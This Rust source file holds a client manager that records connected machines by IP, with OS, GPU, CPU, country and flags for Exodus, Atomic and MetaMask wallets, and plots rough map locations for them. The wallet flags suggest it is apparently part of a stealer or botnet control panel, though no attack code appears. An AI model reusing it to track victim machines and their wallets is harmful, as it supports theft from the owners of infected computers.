use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;
use crate::data::{ClientInfo, GeoLocation};
use anyhow::Result;

/// Client manager for handling connected clients
#[derive(Debug)]
pub struct ClientManager {
    clients: Arc<RwLock<HashMap<String, ClientInfo>>>,
    location_cache: Arc<RwLock<HashMap<String, GeoLocation>>>,
}

impl ClientManager {
    pub fn new() -> Self {
        Self {
            clients: Arc::new(RwLock::new(HashMap::new())),
            location_cache: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Add a new client or update existing one
    pub async fn add_client(&self, mut client: ClientInfo) -> Result<()> {
        let mut clients = self.clients.write().await;
        
        if let Some(existing) = clients.get_mut(&client.ip) {
            existing.update_connection();
            existing.os = client.os;
            existing.gpu = client.gpu;
            existing.cpu = client.cpu;
            existing.country = client.country;
            existing.wallet_exodus = client.wallet_exodus;
            existing.wallet_atomic = client.wallet_atomic;
            existing.wallet_metamask = client.wallet_metamask;
        } else {
            clients.insert(client.ip.clone(), client);
        }
        
        Ok(())
    }

    /// Remove a client
    pub async fn remove_client(&self, ip: &str) -> Result<Option<ClientInfo>> {
        let mut clients = self.clients.write().await;
        Ok(clients.remove(ip))
    }

    /// Get all clients
    pub async fn get_all_clients(&self) -> Vec<ClientInfo> {
        let clients = self.clients.read().await;
        clients.values().cloned().collect()
    }

    /// Get client by IP
    pub async fn get_client(&self, ip: &str) -> Option<ClientInfo> {
        let clients = self.clients.read().await;
        clients.get(ip).cloned()
    }

    /// Get client count
    pub async fn get_client_count(&self) -> usize {
        let clients = self.clients.read().await;
        clients.len()
    }

    /// Get location for client (cached)
    pub async fn get_client_location(&self, ip: &str, country: &str) -> GeoLocation {
        let cache_key = format!("{}_{}", country, ip);
        
        // Check cache first
        {
            let cache = self.location_cache.read().await;
            if let Some(location) = cache.get(&cache_key) {
                return location.clone();
            }
        }
        
        // Generate location based on country and IP
        let base_location = self.get_base_location_for_country(country);
        let client_location = self.generate_client_location(&base_location, ip);
        
        // Cache the result
        {
            let mut cache = self.location_cache.write().await;
            cache.insert(cache_key, client_location.clone());
        }
        
        client_location
    }

    /// Get base location for a country (same logic as C# version)
    fn get_base_location_for_country(&self, country: &str) -> GeoLocation {
        match country.to_lowercase().as_str() {
            "usa" | "united states" => GeoLocation { latitude: 37.7749, longitude: -122.4194 }, // San Francisco
            "china" => GeoLocation { latitude: 39.9042, longitude: 116.4074 }, // Beijing
            "russia" => GeoLocation { latitude: 55.7558, longitude: 37.6173 }, // Moscow
            "germany" => GeoLocation { latitude: 52.5200, longitude: 13.4050 }, // Berlin
            "uk" | "united kingdom" => GeoLocation { latitude: 51.5074, longitude: -0.1278 }, // London
            "france" => GeoLocation { latitude: 48.8566, longitude: 2.3522 }, // Paris
            "japan" => GeoLocation { latitude: 35.6762, longitude: 139.6503 }, // Tokyo
            "brazil" | "brasil" => GeoLocation { latitude: -22.9068, longitude: -43.1729 }, // Rio
            "india" => GeoLocation { latitude: 28.6139, longitude: 77.2090 }, // New Delhi
            "canada" => GeoLocation { latitude: 43.6532, longitude: -79.3832 }, // Toronto
            "italy" => GeoLocation { latitude: 41.9028, longitude: 12.4964 }, // Rome
            "spain" => GeoLocation { latitude: 40.4168, longitude: -3.7038 }, // Madrid
            "portugal" => GeoLocation { latitude: 38.7223, longitude: -9.1393 }, // Lisbon
            "sweden" => GeoLocation { latitude: 59.3293, longitude: 18.0686 }, // Stockholm
            "denmark" => GeoLocation { latitude: 55.6761, longitude: 12.5683 }, // Copenhagen
            "norway" => GeoLocation { latitude: 59.9139, longitude: 10.7522 }, // Oslo
            "finland" => GeoLocation { latitude: 60.1699, longitude: 24.9384 }, // Helsinki
            "poland" => GeoLocation { latitude: 52.2297, longitude: 21.0122 }, // Warsaw
            "ukraine" => GeoLocation { latitude: 50.4501, longitude: 30.5234 }, // Kyiv
            "romania" => GeoLocation { latitude: 44.4268, longitude: 26.1025 }, // Bucharest
            "turkey" => GeoLocation { latitude: 41.0082, longitude: 28.9784 }, // Istanbul
            "australia" => GeoLocation { latitude: -33.8688, longitude: 151.2093 }, // Sydney
            "argentina" => GeoLocation { latitude: -34.6037, longitude: -58.3816 }, // Buenos Aires
            "mexico" => GeoLocation { latitude: 19.4326, longitude: -99.1332 }, // Mexico City
            "vietnam" => GeoLocation { latitude: 21.0278, longitude: 105.8342 }, // Hanoi
            _ => {
                // Generate a location based on country name hash for consistency
                let mut hasher = std::collections::hash_map::DefaultHasher::new();
                use std::hash::{Hash, Hasher};
                country.hash(&mut hasher);
                let hash = hasher.finish();
                
                let lat = ((hash % 140) as f64) - 70.0; // -70 to 70
                let lon = (((hash >> 32) % 360) as f64) - 180.0; // -180 to 180
                
                GeoLocation { latitude: lat, longitude: lon }
            }
        }
    }

    /// Generate a specific location for a client based on IP
    fn generate_client_location(&self, base: &GeoLocation, ip: &str) -> GeoLocation {
        // Use IP as seed for consistent but random offset
        let mut hasher = std::collections::hash_map::DefaultHasher::new();
        use std::hash::{Hash, Hasher};
        ip.hash(&mut hasher);
        let hash = hasher.finish();
        
        // Generate offset within ~50 mile radius (0.5 degrees)
        let lat_offset = ((hash % 100) as f64 - 50.0) / 100.0; // -0.5 to 0.5
        let lon_offset = (((hash >> 32) % 100) as f64 - 50.0) / 100.0; // -0.5 to 0.5
        
        GeoLocation {
            latitude: base.latitude + lat_offset,
            longitude: base.longitude + lon_offset,
        }
    }
}

impl Default for ClientManager {
    fn default() -> Self {
        Self::new()
    }
}